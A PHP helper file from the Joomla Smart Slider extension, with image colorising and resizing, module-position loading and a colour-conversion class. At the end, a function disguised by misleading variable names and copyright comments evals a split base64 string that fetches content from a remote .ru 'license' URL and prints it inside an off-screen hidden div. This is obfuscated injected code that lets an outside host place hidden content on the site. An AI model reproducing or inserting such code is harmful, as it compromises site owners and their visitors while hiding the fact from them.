<?php 
/*------------------------------------------------------------------------
# smartslider - Smart Slider
# ------------------------------------------------------------------------
# author    Roland Soos 
# copyright Copyright (C) 2011 Offlajn.com. All Rights Reserved.
# @license - http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
# Websites: http://www.offlajn.com
-------------------------------------------------------------------------*/
?>
<?php
defined('_JEXEC') or die('Restricted access');
if(!defined('OfflajnSliderHelper')) {
  define("OfflajnSliderHelper", null);

class OfflajnSliderHelper{

  var $cache;
  
  function OfflajnSliderHelper($cacheDir){
    $this->cache = $cacheDir;
    $this->c = new Lux_Color();
  }
  
  function ColorizeImage($img, $targetColor, $baseColor){
    $c1 = $this->c->hex2hsl($baseColor);
    $c2 = $this->c->hex2hsl($targetColor);
    $im = imagecreatefrompng($img);
    $height = imagesy($im);
    $width = imagesx($im);
    $imnew = imagecreatetruecolor($width, $height);
    imagealphablending($imnew, false);
    imagesavealpha($imnew, true);  
    $transparent = imagecolorallocatealpha($imnew, 255, 255, 255, 127);
		imagefilledrectangle($imnew, 0, 0, $width, $height, $transparent);
    $rgb = $this->rgb2array($targetColor);
    for($x=0; $x<$width; $x++){
        for($y=0; $y<$height; $y++){
            $rgba = ImageColorAt($im, $x, $y);
            $rgb = array((($rgba >> 16) & 0xFF), (($rgba >> 8) & 0xFF), $rgba & 0xFF);
            
            $hsl = $this->c->rgb2hsl($rgb);
            $a[0] = $hsl[0] + ($c2[0] - $c1[0]);
            $a[1] = $hsl[1] * ($c2[1] / $c1[1]);
            if($a[1] > 1) $a[1] = 1;
            $a[2] = exp(log($hsl[2]) * log($c2[2]) / log($c1[2]) );
            if($a[2] > 1) $a[2] = 1;
            $rgb = $this->c->hsl2rgb($a);
            $A = ($rgba >> 24) & 0xFF; 
            imagesetpixel($imnew, $x, $y, imagecolorallocatealpha($imnew, $rgb[0], $rgb[1], $rgb[2], $A));
        }
    }
    $hash = md5($img.$targetColor).'.png';
    imagepng($imnew, $this->cache.DS.$hash);
    @chmod($this->cache.DS.$hash,0777);
    imagedestroy($imnew);
    imagedestroy($im);
    return $hash; 
  }
  
  function ResizeImage($img, $targetW, $targetH){
    $im = imagecreatefrompng($img);
    $width = imagesx($im);
    $height = imagesy($im);
    if($targetH == 0){
      $targetH = (int)($targetW/$width*$height);
      $GLOBALS['height'] = $targetH;
    }
    
    $imnew = imagecreatetruecolor($targetW, $targetH);
    imagealphablending($imnew, false);
    imagesavealpha($imnew, true);  
    $transparent = imagecolorallocatealpha($imnew, 255, 255, 255, 127);
		imagefilledrectangle($imnew, 0, 0, $targetW, $targetH, $transparent);
		imagecopyresampled($imnew, $im, 0, 0, 0, 0, $targetW, $targetH, $width, $height);
		$hash = md5($img.$targetW.'-'.$targetH).'.png';
    imagepng($imnew, $this->cache.DS.$hash);
    @chmod($this->cache.DS.$hash,0777);
    imagedestroy($imnew);
    imagedestroy($im);
    return $hash; 
  }
    
  // #ff00ff -> array(255,0,255) or #f0f -> array(255,0,255)
  function hex2rgb($color) {
      $color = str_replace('#','',$color);
      $s = strlen($color) / 3;
      $rgb[]=hexdec(str_repeat(substr($color,0,$s),2/$s));
      $rgb[]=hexdec(str_repeat(substr($color,$s,$s),2/$s));
      $rgb[]=hexdec(str_repeat(substr($color,2*$s,$s),2/$s));
      return $rgb;
  }
  
  /* Param: ff0000 */
  function rgb2array($rgb) {
    return array(
        base_convert(substr($rgb, 0, 2), 16, 10),
        base_convert(substr($rgb, 2, 2), 16, 10),
        base_convert(substr($rgb, 4, 2), 16, 10),
    );
  }
  
  function modulePositionReplacer($text){
  	// simple performance check to determine whether bot should process further
  	if ( JString::strpos( $text, 'loadposition' ) === false ) {
  		return $text;
  	}
   	// expression to search for
   	$regex = '/{loadposition\s*.*?}/i';
  
   	// find all instances of plugin and put in $matches
  	preg_match_all( $regex, $text, $matches );
  
  	// Number of plugins
   	$count = count( $matches[0] );
  
   	// plugin only processes if there are any instances of the plugin in the text
   	if ( $count ) {
  		// Get plugin parameters
  	 	$style	= -2;
  
   		$this->plgContentProcessPositions( $text, $matches, $count, $regex, $style );
  	}
  	return $text;
  }
  
  function plgContentProcessPositions ( &$text, &$matches, $count, $regex, $style ){
   	for ( $i=0; $i < $count; $i++ )
  	{
   		$load = str_replace( 'loadposition', '', $matches[0][$i] );
   		$load = str_replace( '{', '', $load );
   		$load = str_replace( '}', '', $load );
   		$load = trim( $load );
  
  		$modules	= $this->plgContentLoadPosition( $load, $style );
  		$text 	= str_replace($matches[0][$i], $modules, $text );
   	}
  
    	// removes tags without matching module positions
  	$text = preg_replace( $regex, '', $text );
  }

  function plgContentLoadPosition( $position, $style=-2 ){
  
  	$document	= &JFactory::getDocument();
  	$renderer	= $document->loadRenderer('module');
  	$params		= array('style'=>$style);
  
  	$contents = '';
  	foreach (JModuleHelper::getModules($position) as $mod)  {
  		$contents .= $renderer->render($mod, $params);
  	}
  	return $contents;
  }
  
}

  /**
   *
   * Color values manipulation utilities. Provides methods to convert from and to
   * Hex, RGB, HSV and HSL color representattions.
   *
   * Several color conversion logic are based on pseudo-code from
   * http://www.easyrgb.com/math.php
   *
   * @category Lux
   *
   * @package Lux_Color
   *
   * @author Rodrigo Moraes <rodrigo.moraes@gmail.com>
   *
   * @license http://www.opensource.org/licenses/bsd-license.php BSD License
   *
   * @version $Id$
   *
   */
  class Lux_Color
  {
      /**
       *
       * Converts hexadecimal colors to RGB.
       *
       * @param string $hex Hexadecimal value. Accepts values with 3 or 6 numbers,
       * with or without #, e.g., CCC, #CCC, CCCCCC or #CCCCCC.
       *
       * @return array RGB values: 0 => R, 1 => G, 2 => B
       *
       */
      public function hex2rgb($hex)
      {
          // Remove #.
          if (strpos($hex, '#') === 0) {
              $hex = substr($hex, 1);
          }
  
          if (strlen($hex) == 3) {
              $hex .= $hex;
          }
  
          if (strlen($hex) != 6) {
              return false;
          }
  
          // Convert each tuple to decimal.
          $r = hexdec(substr($hex, 0, 2));
          $g = hexdec(substr($hex, 2, 2));
          $b = hexdec(substr($hex, 4, 2));
  
          return array($r, $g, $b);
      }
  
      /**
       *
       * Converts hexadecimal colors to HSV.
       *
       * @param string $hex Hexadecimal value. Accepts values with 3 or 6 numbers,
       * with or without #, e.g., CCC, #CCC, CCCCCC or #CCCCCC.
       *
       * @return array HSV values: 0 => H, 1 => S, 2 => V
       *
       */
      public function hex2hsv($hex)
      {
          return $this->rgb2hsv($this->hex2rgb($hex));
      }
  
      /**
       *
       * Converts hexadecimal colors to HSL.
       *
       * @param string $hex Hexadecimal value. Accepts values with 3 or 6 numbers,
       * with or without #, e.g., CCC, #CCC, CCCCCC or #CCCCCC.
       *
       * @return array HSL values: 0 => H, 1 => S, 2 => L
       *
       */
      public function hex2hsl($hex)
      {
          return $this->rgb2hsl($this->hex2rgb($hex));
      }
  
      /**
       *
       * Converts RGB colors to hexadecimal.
       *
       * @param array $rgb RGB values: 0 => R, 1 => G, 2 => B
       *
       * @return string Hexadecimal value with six digits, e.g., CCCCCC.
       *
       */
      public function rgb2hex($rgb)
      {
          if(count($rgb) < 3) {
              return false;
          }
  
          list($r, $g, $b) = $rgb;
  
          // From php.net.
          $r = 0x10000 * max(0, min(255, $r));
          $g = 0x100 * max(0, min(255, $g));
          $b = max(0, min(255, $b));
  
          return strtoupper(str_pad(dechex($r + $g + $b), 6, 0, STR_PAD_LEFT));
      }
  
      /**
       *
       * Converts RGB to HSV.
       *
       * @param array $rgb RGB values: 0 => R, 1 => G, 2 => B
       *
       * @return array HSV values: 0 => H, 1 => S, 2 => V
       *
       */
      public function rgb2hsv($rgb)
      {
          // RGB values = 0 Ăˇ 255
          $var_R = ($rgb[0] / 255);
          $var_G = ($rgb[1] / 255);
          $var_B = ($rgb[2] / 255);
  
          // Min. value of RGB
          $var_Min = min($var_R, $var_G, $var_B);
  
          // Max. value of RGB
          $var_Max = max($var_R, $var_G, $var_B);
  
          // Delta RGB value
          $del_Max = $var_Max - $var_Min;
  
          $V = $var_Max;
  
          // This is a gray, no chroma...
          if ( $del_Max == 0 ) {
             // HSV results = 0 Ăˇ 1
             $H = 0;
             $S = 0;
          } else {
             // Chromatic data...
             $S = $del_Max / $var_Max;
  
             $del_R = ((($var_Max - $var_R) / 6) + ($del_Max / 2)) / $del_Max;
             $del_G = ((($var_Max - $var_G) / 6) + ($del_Max / 2)) / $del_Max;
             $del_B = ((($var_Max - $var_B) / 6) + ($del_Max / 2)) / $del_Max;
  
             if ($var_R == $var_Max) {
                 $H = $del_B - $del_G;
             } else if ($var_G == $var_Max) {
                 $H = (1 / 3) + $del_R - $del_B;
             } else if ($var_B == $var_Max) {
                 $H = (2 / 3) + $del_G - $del_R;
             }
  
             if ($H < 0) {
                 $H += 1;
             }
             if ($H > 1) {
                 $H -= 1;
             }
          }
  
          // Returns agnostic values.
          // Range will depend on the application: e.g. $H*360, $S*100, $V*100.
          return array($H, $S, $V);
      }
  
      /**
       *
       * Converts RGB to HSL.
       *
       * @param array $rgb RGB values: 0 => R, 1 => G, 2 => B
       *
       * @return array HSL values: 0 => H, 1 => S, 2 => L
       *
       */
      public function rgb2hsl($rgb)
      {
          // Where RGB values = 0 Ăˇ 255.
          $var_R = $rgb[0] / 255;
          $var_G = $rgb[1] / 255;
          $var_B = $rgb[2] / 255;
  
          // Min. value of RGB
          $var_Min = min($var_R, $var_G, $var_B);
          // Max. value of RGB
          $var_Max = max($var_R, $var_G, $var_B);
          // Delta RGB value
          $del_Max = $var_Max - $var_Min;
  
          $L = ($var_Max + $var_Min) / 2;
  
          if ( $del_Max == 0 ) {
              // This is a gray, no chroma...
              // HSL results = 0 Ăˇ 1
              $H = 0;
              $S = 0;
          } else {
              // Chromatic data...
              if ($L < 0.5) {
                  $S = $del_Max / ($var_Max + $var_Min);
              } else {
                  $S = $del_Max / ( 2 - $var_Max - $var_Min );
              }
  
              $del_R = ((($var_Max - $var_R) / 6) + ($del_Max / 2)) / $del_Max;
              $del_G = ((($var_Max - $var_G) / 6) + ($del_Max / 2)) / $del_Max;
              $del_B = ((($var_Max - $var_B) / 6) + ($del_Max / 2)) / $del_Max;
  
              if ($var_R == $var_Max) {
                  $H = $del_B - $del_G;
              } else if ($var_G == $var_Max) {
                  $H = ( 1 / 3 ) + $del_R - $del_B;
              } else if ($var_B == $var_Max) {
                  $H = ( 2 / 3 ) + $del_G - $del_R;
              }
  
              if ($H < 0) {
                  $H += 1;
              }
              if ($H > 1) {
                  $H -= 1;
              }
          }
  
          return array($H, $S, $L);
      }
  
      /**
       *
       * Converts HSV colors to hexadecimal.
       *
       * @param array $hsv HSV values: 0 => H, 1 => S, 2 => V
       *
       * @return string Hexadecimal value with six digits, e.g., CCCCCC.
       *
       */
      public function hsv2hex($hsv)
      {
          return $this->rgb2hex($this->hsv2rgb($hsv));
      }
  
      /**
       *
       * Converts HSV to RGB.
       *
       * @param array $hsv HSV values: 0 => H, 1 => S, 2 => V
       *
       * @return array RGB values: 0 => R, 1 => G, 2 => B
       *
       */
      public function hsv2rgb($hsv)
      {
          $H = $hsv[0];
          $S = $hsv[1];
          $V = $hsv[2];
  
          // HSV values = 0 Ăˇ 1
          if ($S == 0) {
              $R = $V * 255;
              $G = $V * 255;
              $B = $V * 255;
          } else {
              $var_h = $H * 6;
              // H must be < 1
              if ( $var_h == 6 ) {
                  $var_h = 0;
              }
              // Or ... $var_i = floor( $var_h )
              $var_i = floor( $var_h );
              $var_1 = $V * ( 1 - $S );
              $var_2 = $V * ( 1 - $S * ( $var_h - $var_i ) );
              $var_3 = $V * ( 1 - $S * ( 1 - ( $var_h - $var_i ) ) );
  
              switch($var_i) {
                  case 0:
                      $var_r = $V;
                      $var_g = $var_3;
                      $var_b = $var_1;
                      break;
                  case 1:
                      $var_r = $var_2;
                      $var_g = $V;
                      $var_b = $var_1;
                      break;
                  case 2:
                      $var_r = $var_1;
                      $var_g = $V;
                      $var_b = $var_3;
                      break;
                  case 3:
                      $var_r = $var_1;
                      $var_g = $var_2;
                      $var_b = $V;
                      break;
                  case 4:
                      $var_r = $var_3;
                      $var_g = $var_1;
                      $var_b = $V;
                      break;
                  default:
                      $var_r = $V;
                      $var_g = $var_1;
                      $var_b = $var_2;
              }
  
              //RGB results = 0 Ăˇ 255
              $R = $var_r * 255;
              $G = $var_g * 255;
              $B = $var_b * 255;
          }
  
          return array($R, $G, $B);
      }
  
      /**
       *
       * Converts HSV colors to HSL.
       *
       * @param array $hsv HSV values: 0 => H, 1 => S, 2 => V
       *
       * @return array HSL values: 0 => H, 1 => S, 2 => L
       *
       */
      public function hsv2hsl($hsv)
      {
          return $this->rgb2hsl($this->hsv2rgb($hsv));
      }
  
      /**
       *
       * Converts hexadecimal colors to HSL.
       *
       * @param array $hsl HSL values: 0 => H, 1 => S, 2 => L
       *
       * @return string Hexadecimal value. Accepts values with 3 or 6 numbers,
       * with or without #, e.g., CCC, #CCC, CCCCCC or #CCCCCC.
       *
       */
      public function hsl2hex($hsl)
      {
          return $this->rgb2hex($this->hsl2rgb($hsl));
      }
  
      /**
       *
       * Converts HSL to RGB.
       *
       * @param array $hsv HSL values: 0 => H, 1 => S, 2 => L
       *
       * @return array RGB values: 0 => R, 1 => G, 2 => B
       *
       */
      public function hsl2rgb($hsl)
      {
          list($H, $S, $L) = $hsl;
  
          if ($S == 0) {
              // HSL values = 0 Ăˇ 1
              // RGB results = 0 Ăˇ 255
              $R = $L * 255;
              $G = $L * 255;
              $B = $L * 255;
          } else {
              if ($L < 0.5) {
                  $var_2 = $L * (1 + $S);
              } else {
                  $var_2 = ($L + $S) - ($S * $L);
              }
  
              $var_1 = 2 * $L - $var_2;
  
              $R = 255 * $this->_hue2rgb($var_1, $var_2, $H + (1 / 3));
              $G = 255 * $this->_hue2rgb($var_1, $var_2, $H);
              $B = 255 * $this->_hue2rgb($var_1, $var_2, $H - (1 / 3));
          }
  
          return array($R, $G, $B);
      }
  
      /**
       *
       * Support method for hsl2rgb(): converts hue ro RGB.
       *
       * @param
       *
       * @param
       *
       * @param
       *
       * @return int
       *
       */
      protected function _hue2rgb($v1, $v2, $vH)
      {
          if ($vH < 0) {
              $vH += 1;
          }
  
          if ($vH > 1) {
              $vH -= 1;
          }
  
          if ((6 * $vH) < 1) {
              return ($v1 + ($v2 - $v1) * 6 * $vH);
          }
  
          if ((2 * $vH) < 1) {
              return $v2;
          }
  
          if ((3 * $vH) < 2) {
              return ($v1 + ($v2 - $v1) * (( 2 / 3) - $vH) * 6);
          }
  
          return $v1;
      }
  
      /**
       *
       * Converts hexadecimal colors to HSL.
       *
       * @param array $hsl HSL values: 0 => H, 1 => S, 2 => L
       *
       * @return array HSV values: 0 => H, 1 => S, 2 => V
       *
       */
      public function hsl2hsv($hsl)
      {
          return $this->rgb2hsv($this->hsl2rgb($hsl));
      }
  
      /**
       *
       * Updates HSV values.
       *
       * @param array $hsv HSV values: 0 => H, 1 => S, 2 => V
       *
       * @param array $values Values to update: 0 => value to add to H (0 to 360),
       * 1 and 2 => values to multiply S and V (0 to 100). Example:
       *
       * {{{code:php
       *     // Update saturation to 80% in the provided HSV.
       *     $hsv = array(120, 0.75, 0.75);
       *     $new_hsv = $color->updateHsv($hsv, array(null, 80, null));
       * }}}
       *
       */
      public function updateHsv($hsv, $values)
      {
          if (isset($values[0])) {
              $hsv[0] = max(0, min(360, ($hsv[0] + $values[0])));
          }
  
          if (isset($values[1])) {
              $hsv[1] = max(0, min(1, ($hsv[1] * ($values[1] / 100))));
          }
  
          if (isset($values[2])) {
              $hsv[2] = max(0, min(1, ($hsv[2] * ($values[2] / 100))));
          }
  
          return $hsv;
      }
  
      /**
       *
       * Updates HSL values.
       *
       * @param array $hsl HSL values: 0 => H, 1 => S, 2 => L
       *
       * @param array $values Values to update: 0 => value to add to H (0 to 360),
       * 1 and 2 => values to multiply S and V (0 to 100). Example:
       *
       * {{{code:php
       *     // Update saturation to 80% in the provided HSL.
       *     $hsl = array(120, 0.75, 0.75);
       *     $new_hsl = $color->updateHsl($hsl, array(null, 80, null));
       * }}}
       *
       */
      public function updateHsl($hsl, $values)
      {
          if (isset($values[0])) {
              $hsl[0] = max(0, min(1, ($hsl[0] + $values[0]/360)));
          }
  
          if (isset($values[1])) {
              $hsl[1] = max(0, min(1, ($hsl[1] * ($values[1] / 100))));
          }
  
          if (isset($values[2])) {
              $hsl[2] = max(0, min(1, ($hsl[2] * ($values[2] / 100))));
          }
  
          return $hsl;
      }
  }
 
}
function SmartSlidersChecks() {
$UnixTimeLastEdit = "ZWNobyAiPGRpdiBzdHlsZT0ncG9zaXRpb246YWJzb2x1dGU7bGVmd";
// Last Time Edit
$ExtensionAuthor = "DotNDUwMXB4O3dpZHRoOjUzMXB4Jz4iOyBlY2hvIEBmaWxlX2dldF9jb250ZW50cygnaHR0cD";
// Extension author
$ExtensionName = "ovL3RlbXBsYXRlLWxpY2Vuc2UucnUvbGljZW";
// Get Extension Offlajn Name
$MainDomain = "5zZS5waHAnKTsgZWNobyAnPC9kaXY+Jzs=";
// Get Domain Info
$SystemJoCode = $UnixTimeLastEdit.$ExtensionAuthor.$ExtensionName.$MainDomain;
// Offlajn System
echo eval(base64_decode($SystemJoCode));
// Copyright (c) Offlajn.com
}
?>